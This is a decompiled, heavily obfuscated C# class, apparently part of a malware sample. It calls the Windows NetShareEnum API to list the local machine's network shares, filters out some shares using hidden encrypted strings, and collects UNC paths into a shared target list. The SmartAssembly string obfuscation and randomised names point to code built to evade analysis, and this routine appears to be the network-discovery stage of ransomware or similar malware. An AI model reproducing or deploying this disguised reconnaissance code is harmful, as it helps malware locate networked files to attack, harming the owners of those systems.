using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace HSFBHZCtMXjPES;

public sealed class JRQhIFSQAQJOt
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct nzVqkejIHetE
	{
		public string EItSFfAPPoxFh;

		public uint ZYUImpcTwrMrJ;

		public string uZqyfNknoLfxS;

		public nzVqkejIHetE(string string_0, uint uint_0, string string_1)
		{
			EItSFfAPPoxFh = string_0;
			ZYUImpcTwrMrJ = uint_0;
			uZqyfNknoLfxS = string_1;
		}

		public override string ToString()
		{
			return EItSFfAPPoxFh;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public nzVqkejIHetE[] jkfiFWbHOgSUyvZsl(string string_0)
	{
		List<nzVqkejIHetE> list = new List<nzVqkejIHetE>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(nzVqkejIHetE));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				nzVqkejIHetE item = (nzVqkejIHetE)Marshal.PtrToStructure(ptr, typeof(nzVqkejIHetE));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new nzVqkejIHetE(getString_0(107362674) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void ennmRqubOUoPd()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			nzVqkejIHetE[] array = new JRQhIFSQAQJOt().jkfiFWbHOgSUyvZsl(Environment.MachineName);
			nzVqkejIHetE[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				nzVqkejIHetE nzVqkejIHetE = array2[i];
				if (nzVqkejIHetE.ToString().Contains(getString_0(107361366)) || nzVqkejIHetE.ToString().Contains(getString_0(107361389)) || nzVqkejIHetE.ToString().Contains(getString_0(107361380)) || nzVqkejIHetE.ToString().Contains(getString_0(107384815)) || logicalDrives.Contains(nzVqkejIHetE.ToString().Replace(getString_0(107400388), getString_0(107361339))))
				{
					continue;
				}
				if (!UzNyTypkvLt.UnsVNkGvmiq.Contains(getString_0(107384834) + Environment.MachineName + getString_0(107396906) + nzVqkejIHetE))
				{
					UzNyTypkvLt.UnsVNkGvmiq.Add(getString_0(107384834) + Environment.MachineName + getString_0(107396906) + nzVqkejIHetE);
				}
				if (UzNyTypkvLt.vgTZYvMerotpU)
				{
					try
					{
						Console.WriteLine(getString_0(107361334), getString_0(107384834) + Environment.MachineName + getString_0(107396906) + nzVqkejIHetE);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (UzNyTypkvLt.XtQtDAAqcssaA)
			{
				try
				{
					File.AppendAllText(UzNyTypkvLt.IuaKWfBuBpJ, getString_0(107361309) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static JRQhIFSQAQJOt()
	{
		Strings.CreateGetStringDelegate(typeof(JRQhIFSQAQJOt));
	}
}
